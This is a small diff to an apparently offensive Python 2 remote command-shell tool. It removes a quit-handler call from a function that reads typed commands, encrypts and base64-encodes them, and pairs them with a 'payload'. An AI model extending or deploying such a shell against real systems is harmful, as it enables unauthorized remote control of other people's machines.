@@ -54,7 +54,6 @@ def killApplication():
 def spawnShell(answer, payload):
   # Spawns our Command Shell:
   shellInput = raw_input(PROMPT)
-  handleQuit(shellInput)
   if shellInput == 'quit': EXIT = 1 #Set program to exit cleanly
   if shellInput == '': spawnShell(answer, payload) # Prevents whitespace issues
   out = base64.b64encode(encrypt(shellInput))
